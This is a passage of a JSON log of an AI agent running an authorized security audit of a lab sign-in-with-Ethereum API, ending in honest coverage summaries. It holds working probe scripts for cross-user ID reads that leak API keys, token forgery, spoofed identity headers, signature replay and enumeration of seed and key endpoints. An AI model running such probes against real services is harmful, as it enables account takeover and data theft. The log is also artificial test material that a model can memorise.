[\"/api/users/1/mnemonic\",\"/api/users/1/seed\",\"/api/users/1/pk\",\"/api/keys/1\",\"/api/users?id=2\",\"/api/user?id=2\",\"/api/v1/me\",\"/api/session\",\"/api/me/token\",\"/healthz\",\"/api/users/1/wallet?full=1\"];\nout.probes = {};\nfor (const p of probes) { const r = await request(\"GET\", p); out.probes[p] = { s: r.status, b: r.status === 200 ? String(r.resBody).slice(0, 120) : \"\" }; }\nreturn out;"
+        }
+      },
+      {
+        "name": "run_request_script",
+        "args": {
+          "label": "token-quirks-1",
+          "script": "const A = \"0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266\";\nconst AK = \"0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80\";\nconst J = (x) => typeof x === \"string\" ? JSON.parse(x) : x;\nconst n = await request(\"GET\", \"/siwe/nonce\");\nconst msg = buildSiwe({ domain: \"touchstone.lab\", address: A, uri: \"http://touchstone.lab/siwe\", version: \"1\", chainId: 31337, nonce: J(n.resBody).nonce, issuedAt: new Date().toISOString() });\nconst sig = await signPersonal(AK, msg);\nconst v = await request(\"POST\", \"/siwe/verify\", { headers: { \"content-type\": \"application/json\" }, body: JSON.stringify({ message: msg, signature: sig }) });\nconst t = J(v.resBody).token;\nconst H = (val) => ({ authorization: val });\nconst out = { len: t.length };\nout.full = (await request(\"GET\", \"/api/me\", { headers: H(\"Bearer \" + t) })).status;\nout.prefix8 = (await request(\"GET\", \"/api/me\", { headers: H(\"Bearer \" + t.slice(0, 8)) })).status;\nout.prefix16 = (await request(\"GET\", \"/api/me\", { headers: H(\"Bearer \" + t.slice(0, 16)) })).status;\nout.prefix24 = (await request(\"GET\", \"/api/me\", { headers: H(\"Bearer \" + t.slice(0, 24)) })).status;\nout.upper = (await request(\"GET\", \"/api/me\", { headers: H(\"Bearer \" + t.toUpperCase()) })).status;\nout.extraChar = (await request(\"GET\", \"/api/me\", { headers: H(\"Bearer \" + t + \"x\") })).status;\nout.noScheme = (await request(\"GET\", \"/api/me\", { headers: H(t) })).status;\nout.lowerScheme = (await request(\"GET\", \"/api/me\", { headers: H(\"bearer \" + t) })).status;\nout.query = (await request(\"GET\", \"/api/me?token=\" + t)).status;\nconst at = { authorization: \"Bearer \" + t };\nout.ids = {};\nfor (const id of [\"2.0\", \"%32\", \"2abc\", \"02\", \"-1\", \"1e0\"]) {\n  const r = await request(\"GET\", \"/api/users/\" + id, { headers: at });\n  out.ids[id] = { s: r.status, b: String(r.resBody).slice(0, 90) };\n}\nout.misc = {\n  healthz: (await request(\"GET\", \"/healthz\")).resBody,\n  root: (await request(\"GET\", \"/\")).status,\n  optUsers2: (await request(\"OPTIONS\", \"/api/users/2\")).resHeaders\n};\nreturn out;"
+        }
+      },
+      {
+        "name": "run_request_script",
+        "args": {
+          "label": "enum-3",
+          "script": "const A = \"0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266\";\nconst AK = \"0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80\";\nconst J = (x) => typeof x === \"string\" ? JSON.parse(x) : x;\nconst n = await request(\"GET\", \"/siwe/nonce\");\nconst msg = buildSiwe({ domain: \"touchstone.lab\", address: A, uri: \"http://touchstone.lab/siwe\", version: \"1\", chainId: 31337, nonce: J(n.resBody).nonce, issuedAt: new Date().toISOString() });\nconst sig = await signPersonal(AK, msg);\nconst v = await request(\"POST\", \"/siwe/verify\", { headers: { \"content-type\": \"application/json\" }, body: JSON.stringify({ message: msg, signature: sig }) });\nconst at = { authorization: \"Bearer \" + J(v.resBody).token, \"content-type\": \"application/json\" };\nconst paths = [\"/api/users/1/balance\",\"/api/users/1/email\",\"/api/users/1/name\",\"/api/users/1/address\",\"/api/balance\",\"/api/address/0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266\",\"/api/wallet/0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266\",\"/api/addresses\",\"/api/contracts\",\"/api/network\",\"/api/gas\",\"/api/users/1/wallet/\",\"/api/me/\",\"/siwe/logout\",\"/logout\",\"/api/logout\",\"/login\",\"/api/login\",\"/admin\",\"/api/faucet\",\"/api/transfer\",\"/api/tx\",\"/api/users/1/tx\",\"/api/users/1/session\",\"/api/me/profile\",\"/api/me/keys\",\"/api/me/apiKey\",\"/api/apikeys\",\"/api/users/1/apiKey\",\"/api/status\",\"/api/health\",\"/api/admin/stats\",\"/api/stats\"];\nconst out = {};\nfor (const p of paths) {\n  const r = await request(\"GET\", p, { headers: at });\n  if (r.status !== 404) out[\"GET \" + p] = { s: r.status, b: String(r.resBody).slice(0, 130) };\n}\nfor (const p of [\"/api/logout\", \"/api/transfer\"]) {\n  const r = await request(\"POST\", p, { headers: at, body: \"{}\" });\n  if (r.status !== 404) out[\"POST \" + p] = { s: r.status, b: String(r.resBody).slice(0, 130) };\n}\nout.hits = Object.keys(out).length;\nreturn out;"
+        }
+      },
+      {
+        "name": "run_request_script",
+        "args": {
+          "label": "header-trust-1",
+          "script": "const A = \"0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266\";\nconst AK = \"0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80\";\nconst J = (x) => typeof x === \"string\" ? JSON.parse(x) : x;\nconst n = await request(\"GET\", \"/siwe/nonce\");\nconst msg = buildSiwe({ domain: \"touchstone.lab\", address: A, uri: \"http://touchstone.lab/siwe\", version: \"1\", chainId: 31337, nonce: J(n.resBody).nonce, issuedAt: new Date().toISOString() });\nconst sig = await signPersonal(AK, msg);\nconst v = await request(\"POST\", \"/siwe/verify\", { headers: { \"content-type\": \"application/json\" }, body: JSON.stringify({ message: msg, signature: sig }) });\nconst t = J(v.resBody).token;\nconst out = {};\nfor (const [k, val] of [[\"x-user-id\", \"2\"], [\"x-userid\", \"2\"], [\"x-user\", \"2\"], [\"x-forwarded-user\", \"2\"]]) {\n  const r = await request(\"GET\", \"/api/me\", { headers: { [k]: val } });\n  out[\"unauth \" + k] = r.status;\n}\nconst r2 = await request(\"GET\", \"/api/me\", { headers: { authorization: \"Bearer \" + t, \"x-user-id\": \"2\" } });\nout.overrideWithToken = r2.resBody;\nout.cookie = (await request(\"GET\", \"/api/me\", { headers: { cookie: \"token=\" + t } })).status;\nconst r3 = await request(\"GET\", \"/api/users/2/wallet\", { headers: { authorization: \"Bearer \" + t, \"x-user-id\": \"2\" } });\nout.walletOverride = r3.resBody;\nout.emptyBearer = (await request(\"GET\", \"/api/me\", { headers: { authorization: \"Bearer \" } })).status;\nreturn out;"
+        }
+      },
+      {
+        "name": "run_request_script",
+        "args": {
+          "label": "replay-usage-2",
+          "script": "const A = \"0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266\";\nconst AK = \"0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80\";\nconst J = (x) => typeof x === \"string\" ? JSON.parse(x) : x;\nconst h = { \"content-type\": \"application/json\" };\nconst nonce = J((await request(\"GET\", \"/siwe/nonce\")).resBody).nonce;\nconst msg = buildSiwe({ domain: \"touchstone.lab\", address: A, uri: \"http://touchstone.lab/siwe\", version: \"1\", chainId: 31337, nonce, issuedAt: new Date().toISOString() });\nconst sig = await signPersonal(AK, msg);\nconst body = JSON.stringify({ message: msg, signature: sig });\nconst v1 = await request(\"POST\", \"/siwe/verify\", { headers: h, body });\nconst t1 = J(v1.resBody).token;\nconst use1 = await request(\"GET\", \"/api/me\", { headers: { authorization: \"Bearer \" + t1 } });\nconst v2 = await request(\"POST\", \"/siwe/verify\", { headers: h, body });\nconst t2 = J(v2.resBody).token;\nconst use2 = await request(\"GET\", \"/api/me\", { headers: { authorization: \"Bearer \" + t2 } });\nconst v3 = await request(\"POST\", \"/siwe/verify\", { headers: h, body });\nconst t3 = J(v3.resBody).token;\nconst use3 = await request(\"GET\", \"/api/users/2/wallet\", { headers: { authorization: \"Bearer \" + t3 } });\nreturn { t1sameT2: t1 === t2, v1: v1.status, v2: v2.status, v3: v3.status, use1: use1.status, use2: use2.status, use3: use3.status };"
+        }
+      }
+    ],
+    "results": [
+      {
+        "name": "run_request_script",
+        "isError": false,
+        "text": "1. GET /siwe/nonce -> 200 {\"nonce\":\"21037d101faff5d7c6477268\"}\n\nNo known harm pattern matched this transcript. Keep investigating, or try a different request sequence.\n\nstderr: SyntaxError: \"[object Object]\" is not valid JSON\n    at JSON.parse (<anonymous>)\n    at login (file:///app/_run/run.mjs:38:"
+      },
+      {
+        "name": "run_request_script",
+        "isError": false,
+        "text": "1. GET /siwe/nonce -> 200 {\"nonce\":\"e1bb2bbd424e58cb1a77d1fa\"}\n2. POST /siwe/verify -> 200 {\"token\":\"6348b859a4c13d087f8fe5961e13f97cc0317153bd9824b7\",\"user\":{\"id\":1,\"name\":\"alice\"}}\n3. GET /siwe/nonce -> 200 {\"nonce\":\"ce96deff7001b191cd8e1f42\"}\n\nNo known harm pattern matched this transcript. Keep i"
+      },
+      {
+        "name": "run_request_script",
+        "isError": false,
+        "text": "1. GET /siwe/nonce -> 200 {\"nonce\":\"a855bd06f2cfaacd9c1ce379\"}\n2. POST /siwe/verify -> 200 {\"token\":\"4ba85ef9d7715878f7c3f0894d91ed5b0594f165b3f670aa\",\"user\":{\"id\":1,\"name\":\"alice\"}}\n3. GET /siwe/nonce -> 200 {\"nonce\":\"f0d7520fb21e4267a760e06c\"}\n4. POST /siwe/verify -> 401 {\"error\":\"signature verifi"
+      },
+      {
+        "name": "submit_finding",
+        "isError": false,
+        "text": "Recorded finding #1: Broken object level authorization on /api/users/{id}: any session reads any user's profile (high). Do NOT stop. Continue auditing for other root causes. You have 9 script attempts left. When every suspect is proven or ruled out, write the coverage summary."
+      },
+      {
+        "name": "run_request_script",
+        "isError": false,
+        "text": "1. GET /siwe/nonce -> 200 {\"nonce\":\"86798def3f25ca13f6487e26\"}\n2. POST /siwe/verify -> 200 {\"token\":\"5de78b1e7409d088ca6b2804df55c38d88fb463adcf40f3a\",\"user\":{\"id\":1,\"name\":\"alice\"}}\n3. GET /api/users/2/wallet -> 200 {\"id\":2,\"wallet\":\"0x70997970c51812dc3a010c7d01b50e0d17dc79c8\",\"apiKey\":\"tk_bob_77ab"
+      },
+      {
+        "name": "submit_finding",
+        "isError": true,
+        "text": "A finding for this same root cause is already recorded as #1 (\"Broken object level authorization on /api/users/{id}: any session reads any user's profile\"). One finding per root cause — continue with the next suspect instead."
+      },
+      {
+        "name": "run_request_script",
+        "isError": false,
+        "text": "1. GET /siwe/nonce -> 200 {\"nonce\":\"fbdd84aea8884376c561f213\"}\n2. POST /siwe/verify -> 200 {\"token\":\"1bc787ce4d91594bfcd231ef30c3cfaa906917e0ac971091\",\"user\":{\"id\":1,\"name\":\"alice\"}}\n3. POST /siwe/verify -> 200 {\"token\":\"0cd77480e78773395eaad25f3fd4d8142ad5a6187aeddbe7\",\"user\":{\"id\":1,\"name\":\"alice\""
+      },
+      {
+        "name": "run_request_script",
+        "isError": false,
+        "text": "1. GET /siwe/nonce -> 200 {\"nonce\":\"2178a06df66e7d4c16b5ccf4\"}\n2. POST /siwe/verify -> 401 {\"error\":\"unknown or expired nonce\"}\n3. POST /siwe/verify -> 401 {\"error\":\"domain, uri, or chainId mismatch\"}\n4. GET /siwe/nonce -> 200 {\"nonce\":\"54d059ab8f0decd82a74c546\"}\n5. POST /siwe/verify -> 401 {\"error\""
+      },
+      {
+        "name": "run_request_script",
+        "isError": false,
+        "text": "1. GET /siwe/nonce -> 200 {\"nonce\":\"6c5959f80b2514328a54e6dc\"}\n2. POST /siwe/verify -> 200 {\"token\":\"4d237c96b9dd06a9df591222532004cd8f589b025821805c\",\"user\":{\"id\":1,\"name\":\"alice\"}}\n3. POST /siwe/verify -> 200 {\"token\":\"b5374df09640844559e22cce8c2f8f34d5534d6a8737dd02\",\"user\":{\"id\":1,\"name\":\"alice\""
+      },
+      {
+        "name": "run_request_script",
+        "isError": false,
+        "text": "1. GET /siwe/nonce -> 200 {\"nonce\":\"cca8a961f585768af8d727b9\"}\n2. POST /siwe/verify -> 200 {\"token\":\"265d4119dcea1bfb74aae7891ed26fb41f944a449011848c\",\"user\":{\"id\":1,\"name\":\"alice\"}}\n3. GET /api/me -> 401 {\"error\":\"no_session\"}\n4. GET /api/me -> 401 {\"error\":\"no_session\"}\n5. GET /api/me?apiKey=tk_bo"
+      },
+      {
+        "name": "run_request_script",
+        "isError": false,
+        "text": "1. GET /siwe/nonce -> 200 {\"nonce\":\"709e8dd1dd5e32145d29dd55\"}\n2. POST /siwe/verify -> 200 {\"token\":\"7e18d25f1022f3464f00df88fb73213c003a3d6da849fb0e\",\"user\":{\"id\":1,\"name\":\"alice\"}}\n3. GET /siwe/nonce -> 200 {\"nonce\":\"b81eedf974f51afbf80e0025\"}\n4. POST /siwe/verify -> 401 {\"error\":\"signature verifi"
+      },
+      {
+        "name": "run_request_script",
+        "isError": false,
+        "text": "1. GET /siwe/nonce -> 200 {\"nonce\":\"89f67fbdc0ee94cb174afc10\"}\n2. POST /siwe/verify -> 200 {\"token\":\"201a94cc565d41a9d6f35c1db453f678e009e8fa4ad8becf\",\"user\":{\"id\":1,\"name\":\"alice\"}}\n3. GET /api/me -> 200 {\"id\":1,\"name\":\"alice\",\"email\":\"alice@touchstone.lab\",\"wallet\":\"0xf39fd6e51aad88f6f4ce6ab882727"
+      },
+      {
+        "name": "run_request_script",
+        "isError": false,
+        "text": "1. GET /siwe/nonce -> 200 {\"nonce\":\"1b485f487c489ad1e7bffd6d\"}\n2. POST /siwe/verify -> 200 {\"token\":\"6476e81dd93fda896ca1d8f6bba489c387b4d957ae8cc1fb\",\"user\":{\"id\":1,\"name\":\"alice\"}}\n3. GET /api/users/1/balance -> 404 <!DOCTYPE html>\n<html lang=\"en\">\n<head>\n<meta charset=\"utf-8\">\n<title>Error</title"
+      },
+      {
+        "name": "run_request_script",
+        "isError": false,
+        "text": "1. GET /siwe/nonce -> 200 {\"nonce\":\"83bbf76b8c2c8dd30578848e\"}\n2. POST /siwe/verify -> 200 {\"token\":\"19695ae69a7fbcfce4148d757224dad923d17a0fddd2dc89\",\"user\":{\"id\":1,\"name\":\"alice\"}}\n3. GET /api/me -> 401 {\"error\":\"no_session\"}\n4. GET /api/me -> 401 {\"error\":\"no_session\"}\n5. GET /api/me -> 401 {\"err"
+      },
+      {
+        "name": "run_request_script",
+        "isError": true,
+        "text": "Script attempt budget exhausted (12 runs used). These matched attempts are not submitted yet: wallet-idor-isolated, token-quirks-1, header-trust-1. Submit any that prove a new root cause. Stop running scripts and write the coverage summary."
+      }
+    ],
+    "assistants": [
+      {
+        "stop": "toolUse",
+        "text": "I'll start with a plan, then recon.\n\n**Suspects, worst first**\n\n1. **`/siwe/verify` accepts a stale/replayed message** — same signed message minted twice = new sessions with no fresh signature (high). Also: nonce not bound, domain/uri/chainId not checked.\n2. **`/api/users/{id}/wallet` IDOR** — leaks another user's API key (which may be signing material) to any session (high/critical).\n3. **`/api/users/{id}` IDOR** — read another user's profile (high/medium).\n4. **Token forgery / weak token** (predictable, unsigned, or user-id in token).\n5. **Missing auth on `/api/me` or routes reachable with no/invalid session.**\n6. **Undocumented routes** — enumerate; check for debug/secret endpoints.\n\nRecon first.\n\n",
+        "toolCalls": 1
+      },
+      {
+        "stop": "toolUse",
+        "text": "`resBody` is already parsed. Let me fix that.\n\n",
+        "toolCalls": 1
+      },
+      {
+        "stop": "toolUse",
+        "text": "Bob's key in the brief seems one hex nibble short. Let me test padded variants and continue recon with alice meanwhile.\n\n\n\n",
+        "toolCalls": 1
+      },
+      {
+        "stop": "toolUse",
+        "text": "MATCH on `bola-wallet-idor`. Submitting now, then I'll test the wallet route in isolation (it also leaks `apiKey`).\n\n",
+        "toolCalls": 1
+      },
+      {
+        "stop": "toolUse",
+        "text": "Finding #1 recorded. Now isolate the wallet route (it leaks `apiKey` — potentially a separate root cause) in a clean transcript.\n\n",
+        "toolCalls": 1
+      },
+      {
+        "stop": "toolUse",
+        "text": "Same harm pattern but a distinct route and it returns a **credential** (`apiKey`) for another user. Recording it as its own root cause.\n\n",
+        "toolCalls": 1
+      },
+      {
+        "stop": "toolUse",
+        "text": "One root cause, understood. Next suspect: the sign-in flow itself — is a signed message single-use, or can it be replayed to mint fresh sessions?\n\n\n\n",
+        "toolCalls": 1
+      },
+      {
+        "stop": "toolUse",
+        "text": "Replay is accepted but the engine did not flag it. Let me probe which SIWE fields/nonce are actually enforced.\n\n\n\n",
+        "toolCalls": 1
+      },
+      {
+        "stop": "toolUse",
+        "text": "Nonce presence and domain/uri/chainId are enforced; expiry is not. Last attempt on this suspect — check nonce single-use, plus unauth access and a second undocumented-route sweep.\n\n",
+        "toolCalls": 1
+      },
+      {
+        "stop": "toolUse",
+        "text": "No replay/nonce match, no undocumented route yet. Let me test whether the leaked `apiKey` is itself an auth credential (that would raise severity) and probe a wider route/method surface.\n\n\n\n",
+        "toolCalls": 1
+      },
+      {
+        "stop": "toolUse",
+        "text": "`apiKey` isn't an auth credential. New strong suspect: does `/siwe/verify` bind the signature to the `address` inside the message? Test: sign a message **claiming bob's address** with alice's key.\n\n\n\n\n\n",
+        "toolCalls": 1
+      },
+      {
+        "stop": "toolUse",
+        "text": "Address binding is enforced. `/healthz` exists but looks harmless. Next: token-handling weaknesses (truncated/re-encoded bearer) and path-id parsing quirks.\n\n\n\n\n\n",
+        "toolCalls": 1
+      },
+      {
+        "stop": "toolUse",
+        "text": "Token handling and id parsing are solid. Last thread: hidden routes. Broad final discovery sweep.\n\n",
+        "toolCalls": 1
+      },
+      {
+        "stop": "toolUse",
+        "text": "`/healthz` is the only hidden route. Last attempt: does the API trust client-supplied identity headers (a classic missing-auth shortcut)?\n\n",
+        "toolCalls": 1
+      },
+      {
+        "stop": "stop",
+        "text": "Budget spent (0 attempts left). Final summary below.\n\n## Coverage summary\n\n| # | Suspect | Result |\n|---|---|---|\n| 1 | `/siwe/verify` replay: same signed message re-submitted, re-submitted after a new nonce, and nonce reused across two message texts | **Not proven** — 3 attempts, replay is accepted (a new token each time) but no engine harm check matched |\n| 2 | `/api/users/{id}/wallet` cross-user read of `apiKey` | **Proven** — finding #1 (same root cause as #3, engine confirmed duplicate) |\n| 3 | `/api/users/{id}` cross-user profile read | **Proven** — finding #1 |\n| 4 | Signature not bound to the `address` in the message (sign alice-key over bob's address) | **Not exploitable** — `401 signature verification failed` |\n| 5 | `domain` / `uri` / `chainId` not enforced | **Not exploitable** — all three give `401 domain, uri, or chainId mismatch` |\n| 6 | Invented / never-issued nonce | **Not exploitable** — `401 unknown or expired nonce` |\n| 7 | `issuedAt` / no expiry (2020 message accepted) | **Not proven** — accepted, but too weak alone to trip a check |\n| 8 | Token forgery: truncated token, uppercase, extra char, no scheme, `?token=`, `Bearer` lowercase, empty bearer | **Not exploitable** — only the exact `Bearer <48-hex>` works; token is 24 random bytes |\n| 9 | Leaked `apiKey` works as a credential (`x-api-key`, bearer, query) | **Not exploitable** — all `401 no_session` |\n| 10 | Missing auth on `/api/me` / `/api/users/{id}` / `/api/users/{id}/wallet` | **Not exploitable** — correct `401 no_session` |\n| 11 | `/api/me` returns only own data | **Not exploitable** — own row only |\n| 12 | Client-supplied identity headers (`x-user-id`, `x-userid`, `x-user`, `x-forwarded-user`, cookie) | **Not exploitable** — ignored, token is the only identity |\n| 13 | Undocumented routes (≈90 paths, GET/POST/PUT/DELETE/OPTIONS) | **Not exploitable** — only `/healthz` exists (`{\"ok\":true}`, no data) |\n| 14 | Path-id parsing oddities (`2.0`, `%32`, `02`, `1e0`, `-1`, `2abc`) | **Not exploitable** — normal `parseInt` behaviour, no bypass (it is still #1) |\n\n**Bottom line:** one root cause, already recorded as finding #1 — every `/api/*` route takes an `id` from the path and never compares it to the session user. `/api/users/{id}` leaks profile and balance; `/api/users/{id}/wallet` leaks the victim's `apiKey`. The sign-in flow itself held up: nonce, domain, uri, chainId and the address↔signature binding are all checked, and the tokens are strong. The only real soft spots are cosmetic (nonce is not single-use, `issuedAt` expiry is not enforced) and neither tripped a harm check.\n\nTwo notes for the operator: `openapi.yaml` omits `/healthz`, and the private key printed in `BRIEF.md` for bob is one hex nibble short (`0x59c6…78690`, 63 chars), so `signPersonal` rejects it — bob could only be reached through alice's token in this run.",
+        "toolCalls": 0
+      },
+      {
+        "stop": "toolUse",
+        "text": "Let me test whether a replayed signature yields a *second usable session* (the shape I never consumed last time).\n\n",
+        "toolCalls": 1
+      },
+      {
+        "stop": "stop",
+        "text": "Budget is exhausted (12/12 runs used) and all three unsubmitted matches (`wallet-idor-isolated`, `token-quirks-1`, `header-trust-1`) are the same root cause already recorded as finding #1, so there is nothing new to submit.\n\n## Coverage summary\n\n| # | Suspect | Result |\n|---|---|---|\n| 1 | `/api/users/{id}` — any session reads any user's profile (name, e-mail, wallet, balance) | **proven** — finding #1 |\n| 2 | `/api/users/{id}/wallet` — same handler family, leaks the victim's `apiKey` | **proven** — same root cause as #1 (engine confirmed duplicate 3x) |\n| 3 | `/siwe/verify` replay: identical `message`+`signature` re-posted, re-posted after a fresh nonce, nonce reused across two message texts | **not proven** — accepted and minted a new token each time, but no engine harm check fired in 4 attempts (also could not confirm in the last run whether the replayed token stays usable — budget ran out) |\n| 4 | `issuedAt` / `expirationTime` not enforced (a 2020 message verified fine) | **not proven** — accepted, but too weak on its own to trip a check |\n| 5 | Signature not bound to the `address` in the message (alice's key signing bob's address) | **not exploitable** — `401 signature verification failed` |\n| 6 | `domain` / `uri` / `chainId` not checked | **not exploitable** — all three give `401 domain, uri, or chainId mismatch` |\n| 7 | Invented / never-issued nonce | **not exploitable** — `401 unknown or expired nonce` |\n| 8 | Token forgery: truncated, uppercase, extra char, `?token=`, no scheme, lowercase `bearer`, empty bearer | **not exploitable** — only exact `Bearer <48 hex>` works; 24 random bytes |\n| 9 | Leaked `apiKey` used as a credential (`x-api-key`, bearer, query param) | **not exploitable** — all `401 no_session` |\n| 10 | Missing auth on `/api/me`, `/api/users/{id}`, `/api/users/{id}/wallet` | **not exploitable** — correct `401 no_session` |\n| 11 | `/api/me` over-fetch of other users | **not exploitable** — own row only |\n| 12 | Client-supplied identity (`x-user-id`, `x-userid`, `x-user`, `x-forwarded-user`, cookie) | **not exploitable** — ignored; the token is the only identity |\n| 13 | Undocumented routes (~90 paths, GET/POST/PUT/DELETE/OPTIONS) | **not exploitable** — only `/healthz` exists, returns `{\"ok\":true}` and no data |\n| 14 | Path-id parsing bypass (`2.0`, `%32`, `02`, `1e0`, `-1`, `2abc`) | **not exploitable** — plain `parseInt`, feeds the same unchecked lookup as #1 |\n| 15 | Users beyond id 2 (admin/higher-id rows with extra fields) | **not tried** — budget ended; ids `0` and `-1` both 404 |\n\n**Result: 1 finding.** One root cause — every `/api/users/...` route trusts the `id` in the path and never compares it to the session user, so `GET /api/users/2` and `GET /api/users/2/wallet` both hand bob's data (including his `apiKey`) to alice. The sign-in flow itself is otherwise well built: nonce presence, `domain`, `uri`, `chainId` and the address↔signature binding are all enforced, and tokens are strong. The two soft spots are nonce single-use and message expiry, and neither was strong enough to trip a harm check.\n\nTwo operator notes: `openapi.yaml` does not document `/healthz`, and the bob private key in `BRIEF.md` is one hex nibble short (63 chars, `0x59c6…78690`), so `signPersonal` rejects it — bob could only be reached through alice's token this run.",
+        "toolCalls": 0
+      }
+    ],
+    "final": {
+      "stop": "stop",
+      "text": "Budget is exhausted (12/12 runs used) and all three unsubmitted matches (`wallet-idor-isolated`, `token-quirks-1`, `header-trust-1`) are the same root cause already recorded as finding #1, so there is nothing new to submit.\n\n## Coverage summary\n\n| # | Suspect | Result |\n|---|---|---|\n| 1 | `/api/users/{id}` — any session reads any user's profile (name, e-mail, wallet, balance) | **proven** — finding #1 |\n| 2 | `/api/users/{id}/wallet` — same handler family, leaks the victim's `apiKey` | **proven** — same root cause as #1 (engine confirmed duplicate 3x) |\n| 3 | `/siwe/verify` replay: identical `message`+`signature` re-posted, re-posted after a fresh nonce, nonce reused across two message texts | **not proven** — accepted and minted a new token each time, but no engine harm check fired in 4 attempts (also could not confirm in the last run whether the replayed token stays usable — budget ran out) |\n| 4 | `issuedAt` / `expirationTime` not enforced (a 2020 message verified fine) | **not proven** — accepted, but too weak on its own to trip a check |\n| 5 | Signature not bound to the `address` in the message (alice's key signing bob's address) | **not exploitable** — `401 signature verification failed` |\n| 6 | `domain` / `uri` / `chainId` not checked | **not exploitable** — all three give `401 domain, uri, or chainId mismatch` |\n| 7 | Invented / never-issued nonce | **not exploitable** — `401 unknown or expired nonce` |\n| 8 | Token forgery: truncated, uppercase, extra char, `?token=`, no scheme, lowercase `bearer`, empty bearer | **not exploitable** — only exact `Bearer <48 hex>` works; 24 random bytes |\n| 9 | Leaked `apiKey` used as a credential (`x-api-key`, bearer, query param) | **not exploitable** — all `401 no_session` |\n| 10 | Missing auth on `/api/me`, `/api/users/{id}`, `/api/users/{id}/wallet` | **not exploitable** — correct `401 no_session` |\n| 11 | `/api/me` over-fetch of other users | **not exploitable** — own row only |\n| 12 | Client-supplied identity (`x-user-id`, `x-userid`, `x-user`, `x-forwarded-user`, cookie) | **not exploitable** — ignored; the token is the only identity |\n| 13 | Undocumented routes (~90 paths, GET/POST/PUT/DELETE/OPTIONS) | **not exploitable** — only `/healthz` exists, returns `{\"ok\":true}` and no data |\n| 14 | Path-id parsing bypass (`2.0`, `%32`, `02`, `1e0`, `-1`, `2abc`) | **not exploitable** — plain `parseInt`, feeds the same unchecked lookup as #1 |\n| 15 | Users beyond id 2 (admin/higher-id rows with extra fields) | **not tried** — budget ended; ids `0` and `-1` both 404 |\n\n**Result: 1 finding.** One root cause — every `/api/users/...` route trusts the `id` in the path and never compares it to the session user, so `GET /api/users/2` and `GET /api/users/2/wallet` both hand bob's data (including his `apiKey`) to alice. The sign-in flow itself is otherwise well built: nonce presence, `domain`, `uri`, `chainId` and the address↔signature binding are all enforced, and tokens are strong. The two soft spots are nonce single-use and message expiry, and neither was strong enough to trip a harm check.\n\nTwo operator notes: `openapi.yaml` does not document `/healthz`, and the bob private key in `BRIEF.md` is one hex nibble short (63 chars, `0x59c6…78690`), so `signPersonal` rejects it — bob could only be reached through alice's token this run.",
+      "toolCalls": 0
+    }
+  }
+}
